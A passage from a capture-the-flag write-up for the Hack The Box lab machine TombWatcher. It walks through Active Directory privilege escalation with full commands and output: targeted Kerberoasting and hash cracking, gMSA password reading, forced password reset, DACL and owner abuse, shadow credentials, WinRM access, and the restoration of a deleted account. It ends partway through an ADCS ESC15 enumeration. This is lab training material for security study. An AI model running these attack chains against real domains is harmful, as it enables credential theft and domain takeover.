┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s "ldap://$(pt get rhost)" all ldeep/
[+] Retrieving auth_policies output
[+] Retrieving auth_policies verbose output
[+] Retrieving bitlockerkeys output
[+] Retrieving bitlockerkeys verbose output
[+] Retrieving computers output
[+] Retrieving conf output
[...]
```

Parse the data

- **ADCS** is enabled

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 2145409 Jun 22 21:40 ldeep/_schema.lst
-rw-r--r-- 1 bravosec kali   30605 Jun 22 21:40 ldeep/_templates.lst
-rw-r--r-- 1 bravosec kali    1070 Jun 22 21:40 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali     743 Jun 22 21:40 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali     333 Jun 22 21:40 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali     230 Jun 22 21:40 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali     188 Jun 22 21:40 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali     136 Jun 22 21:40 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali      58 Jun 22 21:40 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali      49 Jun 22 21:40 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali      45 Jun 22 21:40 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali      43 Jun 22 21:40 ldeep/_gmsa.lst
-rw-r--r-- 1 bravosec kali      42 Jun 22 21:40 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali      21 Jun 22 21:40 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali      21 Jun 22 21:40 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali      19 Jun 22 21:40 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali      16 Jun 22 21:40 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali      13 Jun 22 21:40 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali       7 Jun 22 21:40 ldeep/_users_spn.lst
-rw-r--r-- 1 bravosec kali       6 Jun 22 21:40 ldeep/_users_passwordnotrequired.lst

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Enterprise Admins,CN=Users,DC=tombwatcher,DC=htb": [
    "attacker",
    "Administrator"
  ],
  "CN=Remote Management Users,CN=Builtin,DC=tombwatcher,DC=htb": [
    "john"
  ],
  "CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb": [
    "Alfred"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=tombwatcher,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=tombwatcher,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=tombwatcher,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=tombwatcher,DC=htb": [
    "Administrator"
  ],
  "CN=Users,CN=Builtin,DC=tombwatcher,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=tombwatcher,DC=htb": [
    "Administrator"
  ]
}
```


### User access check


#### AD

- `Henry` has write access to `servicePrincipalName` on `Alfred`

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=Henry,CN=Users,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
permission: WRITE

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k get writable --detail
[...]
distinguishedName: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
servicePrincipalName: WRITE
```


#### SMB Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10 --log nxc_shares.log -k
SMB         DC01.tombwatcher.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         DC01.tombwatcher.htb 445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         DC01.tombwatcher.htb 445    DC01             [*] Enumerated shares
SMB         DC01.tombwatcher.htb 445    DC01             Share           Permissions     Remark
SMB         DC01.tombwatcher.htb 445    DC01             -----           -----------     ------
SMB         DC01.tombwatcher.htb 445    DC01             ADMIN$                          Remote Admin
SMB         DC01.tombwatcher.htb 445    DC01             C$                              Default share
SMB         DC01.tombwatcher.htb 445    DC01             IPC$            READ            Remote IPC
SMB         DC01.tombwatcher.htb 445    DC01             NETLOGON        READ            Logon server share
SMB         DC01.tombwatcher.htb 445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/DC01.tombwatcher.htb.json".
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] Total folders found:  16
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] Total files found:    4
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] File size average:    1.48 KB
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] File size min:        22 B
SPIDER_PLUS DC01.tombwatcher.htb 445    DC01             [*] File size max:        4.8 KB
```


### DACL Abuse - Targeted Kerberoast

Add a SPN for `Alfred` then **kerberoast** it, which is **targetedKerberoast**

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -o targetedkerberoast.txt -v -d "$(pt get domain)" -u "$(pt get user)" -p "$(pt get pass)" --request-user 'Alfred'
[*] Starting kerberoast attacks
[*] Attacking user (Alfred)
[+] Writing hash to file for (Alfred)

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ cat targetedkerberoast.txt
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$b6f82b8b71afac4b21eb167f68938d74$b1cf1251d11d6604117473f638f5153f9d139542634f0a33af2c021df9044e8cb30c051b12664f56bda98c1ad8250691c68bbfb6430ceb41883db6ac7bba4b47524f365165a11608e4fe7276e04c26c0045f1e075606eb946343e113cf98bb8dca76539067fcc68a6d4c04ea343ba93057ef23d9b6111c62a84fe758b40538d5ab426196b8af6204ea648ea138388cf9b2c4873e7b85ab01c9ea2f3ae8cdf0afcd8d2420fc9c62aa7917b23272efc5a97c12ffcea53b7496f842a5e71e3576c20a3c823c8ef62297a6273d4a5863edac8c18a8f2c4d708ab30d3c49de6a9079ede68a2dc8ca2c76ab04264f12e5d500a9d8ac04acd44d2cf7fd2d4d3c8955c936b79b6031cf02515994a98e8d2ee8204e13083c2872d3105011de4370fe7e4aec9cced6690376fa41c33f252ea72b9ea02d7d66df33d92c5d719c56c251488f53318db520554400e549f6ae7f073e933d034e66aa83a011db127aa46b6ee455db76d68e3b05a9fd65f0f4cbbbfa778ab44fe7a3e1d3b1090ae52ed5d92c7910615a0e6a083183561e0b42a4d86738cd675441a681f6970a096fa80ac7a541ffb7bc571ce94778de051bffa165967ce0a94c19605375f0ac288e3a3ba973c5c2f6ddfbbd6449a9bb8625eba63353b94635833bff586bd909cc81c2a4ff699e3372ce5088771485867fdf661a4023faebeebf0006a35130cdd1c5af7ca963768ea99e3102c5abfc0f576ccb4a0ed997fe8dea282b4e6a85e542ab29027ca472eb99dce1ca014986e729422fc23be30130d2b8bbee80fa5f3d1f49fc59f150edf33dab50e5313f94afad3574b9fdc4c8d00d7a35c5a085c9d846e67fcf81d478def9c2a73291496809127f794fdfb90b6b854c7436832adec9f5554cd2bdd9514ffa557f90456ed88606cf9f08a888e9ea139ca2c01ee5c688ddbad6c1605cc4b199c446edbc82ac9989f7c1a101221621b18ac44b27ac7a56b84ef532695abc4f168b6efd2669d59b3fdf7ab4eb10a47704015bf6d5b6edd2ac1ac53877f857ad272f3dfc1025cefb144a51e50e222fec4cef9cbbdd7c57cdcc6d354bea91bc4bf3703bab221b9fd6d157d6bd5e7cef49ce4215357db44f09f0e57ebfbf61e410448b0ee6349bd46ae9053d438607a4a78884cc93587443a87c634444aff66f264ec05829b908ca060b4b7ffc9added8e5ea48d9cad92fc9b41b0d03d1e27b396523bf3f14d0324a892f1e554d5f9aeec96bca269b9c1ae62d1b41240df2f0355a92fb30252fec6f3cdca4e47fea7837ba65ef71d7bcd099e33ebc4d58af6087842cc5b748b19107739a5b45592cdfe33dabb37943a5a0e941cb34ef67072916c6e44d2065db79c9be67d60ba057504d2af6912eb6398d8cb5ecd8f18d03f8471cb6a60da6c373437775d57b28ccca9057742beac0288079354284655a0df1552d7c0b2dc0f677072d2def22c01a09cea84148ff2b07
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ hashcat targetedkerberoast.txt /opt/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule
[...]

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ hashcat targetedkerberoast.txt /opt/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$b6f82b8b71afac4b21eb167f68938d74$b1cf1251d11d6604117473f638f5153f9d139542634f0a33af2c021df9044e8cb30c051b12664f56bda98c1ad8250691c68bbfb6430ceb41883db6ac7bba4b47524f365165a11608e4fe7276e04c26c0045f1e075606eb946343e113cf98bb8dca76539067fcc68a6d4c04ea343ba93057ef23d9b6111c62a84fe758b40538d5ab426196b8af6204ea648ea138388cf9b2c4873e7b85ab01c9ea2f3ae8cdf0afcd8d2420fc9c62aa7917b23272efc5a97c12ffcea53b7496f842a5e71e3576c20a3c823c8ef62297a6273d4a5863edac8c18a8f2c4d708ab30d3c49de6a9079ede68a2dc8ca2c76ab04264f12e5d500a9d8ac04acd44d2cf7fd2d4d3c8955c936b79b6031cf02515994a98e8d2ee8204e13083c2872d3105011de4370fe7e4aec9cced6690376fa41c33f252ea72b9ea02d7d66df33d92c5d719c56c251488f53318db520554400e549f6ae7f073e933d034e66aa83a011db127aa46b6ee455db76d68e3b05a9fd65f0f4cbbbfa778ab44fe7a3e1d3b1090ae52ed5d92c7910615a0e6a083183561e0b42a4d86738cd675441a681f6970a096fa80ac7a541ffb7bc571ce94778de051bffa165967ce0a94c19605375f0ac288e3a3ba973c5c2f6ddfbbd6449a9bb8625eba63353b94635833bff586bd909cc81c2a4ff699e3372ce5088771485867fdf661a4023faebeebf0006a35130cdd1c5af7ca963768ea99e3102c5abfc0f576ccb4a0ed997fe8dea282b4e6a85e542ab29027ca472eb99dce1ca014986e729422fc23be30130d2b8bbee80fa5f3d1f49fc59f150edf33dab50e5313f94afad3574b9fdc4c8d00d7a35c5a085c9d846e67fcf81d478def9c2a73291496809127f794fdfb90b6b854c7436832adec9f5554cd2bdd9514ffa557f90456ed88606cf9f08a888e9ea139ca2c01ee5c688ddbad6c1605cc4b199c446edbc82ac9989f7c1a101221621b18ac44b27ac7a56b84ef532695abc4f168b6efd2669d59b3fdf7ab4eb10a47704015bf6d5b6edd2ac1ac53877f857ad272f3dfc1025cefb144a51e50e222fec4cef9cbbdd7c57cdcc6d354bea91bc4bf3703bab221b9fd6d157d6bd5e7cef49ce4215357db44f09f0e57ebfbf61e410448b0ee6349bd46ae9053d438607a4a78884cc93587443a87c634444aff66f264ec05829b908ca060b4b7ffc9added8e5ea48d9cad92fc9b41b0d03d1e27b396523bf3f14d0324a892f1e554d5f9aeec96bca269b9c1ae62d1b41240df2f0355a92fb30252fec6f3cdca4e47fea7837ba65ef71d7bcd099e33ebc4d58af6087842cc5b748b19107739a5b45592cdfe33dabb37943a5a0e941cb34ef67072916c6e44d2065db79c9be67d60ba057504d2af6912eb6398d8cb5ecd8f18d03f8471cb6a60da6c373437775d57b28ccca9057742beac0288079354284655a0df1552d7c0b2dc0f677072d2def22c01a09cea84148ff2b07:basketball
```

The credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'Alfred' 'basketball'
Alfred:basketball

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ nxc smb $(pt get rhost) -k -u "$(pt get user)" -p "$(pt get pass)"
SMB         DC01.tombwatcher.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         DC01.tombwatcher.htb 445    DC01             [+] tombwatcher.htb\Alfred:basketball
```


## Auth as ansible_dev$


### User access check


#### AD

- `Infrastructure` group has access to read GMSA password (`ansible_dev$`)
- `Alfred` can add itself to `Infrastructure` group

![](/assets/obsidian/2722461c57ae3ddae8bad68d55dd51c3.png)


### DACL Abuse - AddSelf

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k add groupMember 'Infrastructure' 'Alfred'
[+] Alfred added to Infrastructure
```


### DACL Abuse - Read GMSA Password

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d $(pt get domain) -s ldap://$(pt get domain) gmsa
ansible_dev$:nthash:4b21348ca4a9edff9689cdf75cbda439
ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
ansible_dev$:reader:Infrastructure (group)
```

Request a TGT via `aes256` key to simulate normal **kerberos** authentication

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'ansible_dev$' '499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a'
[*] Hash set for user ansible_dev$

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ getTGT.py -dc-ip $(pt get ip) -aesKey "$(pt get hash)" "$(pt get domain)"/"$(pt get user)"; pt set ticket $(realpath "$(pt get user).ccache")
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250529.25123.80c4dba - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ansible_dev$.ccache
```


## Auth as SAM


### User access check


#### AD

- `ansible_dev$` can force change the account `SAM`'s password

![](/assets/obsidian/452c77e89704682ad130d208aa23fcf5.png)


### DACL Abuse - Force Change Password

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f aes -k set password SAM 'Bravosec1337!'
[+] Password changed successfully!
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'SAM' 'Bravosec1337!'
[+] Password set for user SAM
```


## Shell as john


### User access check


#### AD

- `SAM` owns the account `John`
- `John` is in `Remote Management Users` group, which has **winrm** access to domain computers

![](/assets/obsidian/1831fc1f060ff0a6a989bb763f754ef1.png)


### DACL Abuse - Write Owner

Set `John`'s owner to `SAM`

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k set owner 'john' 'SAM'
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by SAM on john
```

Grant `GenericALL` access for `SAM` on `John`

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get pass)" -k add genericAll 'john' 'SAM'
[+] SAM has now GenericAll on john
```


### DACL Abuse - Shadow Credentials

Since **ADCS** is enabled, we can create shadow credentials for `john` and **Pass-The-Ticket** to retrieve its NT hash

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ nxc ldap $(pt get rhost) -k -u "$(pt get user)" -p "$(pt get pass)" -M adcs
LDAP        DC01.tombwatcher.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        DC01.tombwatcher.htb 389    DC01             [+] tombwatcher.htb\SAM:Bravosec1337!
ADCS        DC01.tombwatcher.htb 389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        DC01.tombwatcher.htb 389    DC01             Found PKI Enrollment Server: DC01.tombwatcher.htb
ADCS        DC01.tombwatcher.htb 389    DC01             Found CN: tombwatcher-CA-1
```

Create shadow credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ certipy shadow auto -dc-ip $(pt get ip) -u "$(pt get user)" -p "$(pt get pass)" -account 'John'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5d1bd5c6-2e47-53c6-cccd-1aaa9d183526'
[*] Adding Key Credential with device ID '5d1bd5c6-2e47-53c6-cccd-1aaa9d183526' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '5d1bd5c6-2e47-53c6-cccd-1aaa9d183526' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': dd896710b8a7a6ee67200dc79942d53b
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'john' 'dd896710b8a7a6ee67200dc79942d53b'
[+] Hash set for user john

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ pt set ticket $(realpath `ls -t *.ccache|head -1`)
```

### 5985 - Winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
*Evil-WinRM* PS C:\Users\john\Documents> cat ..\Desktop\user.txt
54bc0e258bbf54d9dda0c37289ebcb5c
```


# Root Flag
---

## Auth as cert_admin


### User access check


#### AD

- `john` has **GenericALL** rights over `ADCS` organization unit

![](/assets/obsidian/146415fe650f54f858294abe2574d8b1.png)

- `ADCS` OU doesn't contain any interesting objects

![](/assets/obsidian/6d5f1418056c7dceb0a06f608f5eea97.png)


### AD recycle bin - Restore user object

- The OU name `ADCS` could be related to AD objects that can manage AD certificates

By searching for recycled/deleted AD objects using **extended search** under the **OU** `ADCS`, we found a deleted user `cert_admin`

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --attr 'whenChanged,objectClass,distinguishedName' --filter '(&(|(isDeleted=TRUE)(isRecycled=TRUE))(lastKnownParent=OU=ADCS,DC=tombwatcher,DC=htb))'

distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
objectClass: top; person; organizationalPerson; user
whenChanged: 2025-07-09 13:37:00+00:00

distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
objectClass: top; person; organizationalPerson; user
whenChanged: 2024-11-16 17:04:21+00:00

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
objectClass: top; person; organizationalPerson; user
whenChanged: 2025-07-09 12:22:00+00:00
```

> Alternatively, It can be done by using powershell with AD module
> 
> ```powershell
> *Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * | select whenChanged, ObjectClass, DistinguishedName
> 
> whenChanged            ObjectClass DistinguishedName
> -----------            ----------- -----------------
> 11/15/2024 7:56:00 PM  container   CN=Deleted Objects,DC=tombwatcher,DC=htb
> 11/15/2024 7:57:59 PM  user        CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
> 11/16/2024 12:04:21 PM user        CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
> 6/22/2025 5:22:02 PM   user        CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
> ```
{: .prompt-tip }

`cert_admin` doesn't exist right now

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get object 'cert_admin'
[...]
bloodyAD.exceptions.NoResultError: [-] No object found in DC=tombwatcher,DC=htb with filter: (sAMAccountName=cert_admin)
```

Restore the user

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" set restore cert_admin
[+] cert_admin has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
```

> Alternatively, It can be done by using powershell with AD module
> 
> ```powershell
> *Evil-WinRM* PS C:\Users\john\Documents> Restore-adobject -identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
> ```
{: .prompt-tip }

We can see that `cert_admin` was restored and activated

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" get object 'cert_admin'
[...]
sAMAccountName: cert_admin
sAMAccountType: 805306368
sn: cert_admin
uSNChanged: 90862
uSNCreated: 12844
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
[...]
```


### DACL Abuse - Shadow credentials

- `john` has `GenericAll` right over `cert_admin`

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u "$(pt get user)" -p "$(pt get hash)" -f rc4 -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: CN=john,CN=Users,DC=tombwatcher,DC=htb
permission: WRITE

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

Let's create a shadow credential for `cert_admin`

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ certipy shadow auto -dc-ip $(pt get ip) -u "$(pt get user)" -hashes ":$(pt get hash)" -account 'cert_admin'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'cert_admin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '86e85953-dae8-17ce-056b-22048e03f1bb'
[*] Adding Key Credential with device ID '86e85953-dae8-17ce-056b-22048e03f1bb' to the Key Credentials for 'cert_admin'
[*] Successfully added Key Credential with device ID '86e85953-dae8-17ce-056b-22048e03f1bb' to the Key Credentials for 'cert_admin'
[*] Authenticating as 'cert_admin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'cert_admin@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'cert_admin.ccache'
[*] Wrote credential cache to 'cert_admin.ccache'
[*] Trying to retrieve NT hash for 'cert_admin'
[*] Restoring the old Key Credentials for 'cert_admin'
[*] Successfully restored the old Key Credentials for 'cert_admin'
[*] NT hash for 'cert_admin': 9b78642aadb05fa55a93dfb811f817d5
```

Validated the credential

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'cert_admin' '9b78642aadb05fa55a93dfb811f817d5'
[+] Hash set for user cert_admin

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -H "$(pt get hash)" -k
SMB         DC01.tombwatcher.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         DC01.tombwatcher.htb 445    DC01             [+] tombwatcher.htb\cert_admin:9b78642aadb05fa55a93dfb811f817d5
```


## Shell as domain admin


### ADCS - ESC15 (Arbitrary application policy) (CVE-2024-49019)

Check rights to ADCS since we are certificate admin

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ certipy find -dc-ip $(pt get ip) -u "$(pt get user)" -hashes "$(pt get hash)" -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
